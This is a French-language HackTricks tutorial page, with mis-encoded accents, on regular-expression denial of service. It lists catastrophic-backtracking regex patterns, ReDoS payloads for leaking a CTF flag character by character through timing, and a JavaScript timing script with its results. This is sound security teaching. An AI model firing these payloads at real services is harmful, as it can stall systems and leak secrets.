# D√©ni de Service par Expression R√©guli√®re - ReDoS

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

# D√©ni de Service par Expression R√©guli√®re (ReDoS)

Le D√©ni de Service par Expression R√©guli√®re (ReDoS) est un type d'attaque par d√©ni de service qui **exploite les inefficacit√©s des impl√©mentations d'expressions r√©guli√®res**. La plupart des moteurs d'expressions r√©guli√®res peuvent rencontrer des situations extr√™mes o√π ils **fonctionnent tr√®s lentement, souvent de mani√®re exponentielle par rapport √† la taille de l'entr√©e**. En exploitant cela, un attaquant peut provoquer un blocage prolong√© d'un programme utilisant des expressions r√©guli√®res.

## L'Algorithme Na√Øf de Regex Probl√©matique

**Consultez les d√©tails sur [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)**


## Regex Malveillantes <a href="#evil-regexes" id="evil-regexes"></a>

Un motif d'expression r√©guli√®re malveillant fait r√©f√©rence √† un qui peut **se bloquer sur une entr√©e fabriqu√©e**. Les motifs de regex malveillants contiennent g√©n√©ralement un groupement avec r√©p√©tition et r√©p√©tition ou alternance avec chevauchement √† l'int√©rieur du groupe r√©p√©t√©. Voici quelques exemples de motifs malveillants :

* (a+)+
* ([a-zA-Z]+)*
* (a|aa)+
* (a|a?)+
* (.*a){x} pour x > 10

Tous les exemples ci-dessus sont susceptibles √† l'entr√©e `aaaaaaaaaaaaaaaaaaaaaaaa!` (La longueur minimale de l'entr√©e peut l√©g√®rement varier, en fonction de la rapidit√© ou de la lenteur des machines).

## Payloads ReDoS

### Exfiltration de Cha√Æne via ReDoS

Dans un CTF (ou bug bounty), peut-√™tre que vous **contr√¥lez le Regex avec lequel une information sensible (le drapeau) est compar√©e**. Alors, il peut √™tre utile de faire **geler la page (timeout ou temps de traitement plus long)** si le **Regex correspond** et **pas s'il ne correspond pas**. De cette mani√®re, vous pourrez **exfiltrer** la cha√Æne **caract√®re par caract√®re** :

* Dans [**ce post**](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets) vous pouvez trouver cette r√®gle ReDoS : `^(?=<flag>)((.*)*)*salt$`
* Exemple : `^(?=HTB{sOmE_fl¬ßN¬ß)((.*)*)*salt$`
* Dans [**ce writeup**](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html) vous pouvez trouver celui-ci :`<flag>(((((((.*)*)*)*)*)*)*)!`
* Dans [**ce writeup**](https://ctftime.org/writeup/25869) il a utilis√© : `^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$`

### ReDoS Contr√¥lant l'Entr√©e et le Regex

Voici des exemples de **ReDoS** o√π vous **contr√¥lez** √† la fois l'**entr√©e** et le **regex** :
```javascript
function check_time_regexp(regexp, text){
var t0 = new Date().getTime();;
new RegExp(regexp).test(text);
var t1 = new Date().getTime();;
console.log("Regexp " + regexp + " took " + (t1 - t0) + " milliseconds.")
}

// This payloads work because the input has several "a"s
[
//  "((a+)+)+$",  //Eternal,
//  "(a?){100}$", //Eternal
"(a|a?)+$",
"(\\w*)+$",   //Generic
"(a*)+$",
"(.*a){100}$",
"([a-zA-Z]+)*$", //Generic
"(a+)*$",
].forEach(regexp => check_time_regexp(regexp, "aaaaaaaaaaaaaaaaaaaaaaaaaa!"))

/*
Regexp (a|a?)+$ took 5076 milliseconds.
Regexp (\w*)+$ took 3198 milliseconds.
Regexp (a*)+$ took 3281 milliseconds.
Regexp (.*a){100}$ took 1436 milliseconds.
Regexp ([a-zA-Z]+)*$ took 773 milliseconds.
Regexp (a+)*$ took 723 milliseconds.
*/
```
## Outils

* [https://github.com/doyensec/regexploit](https://github.com/doyensec/regexploit)
* [https://devina.io/redos-checker](https://devina.io/redos-checker)

# R√©f√©rences
* [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
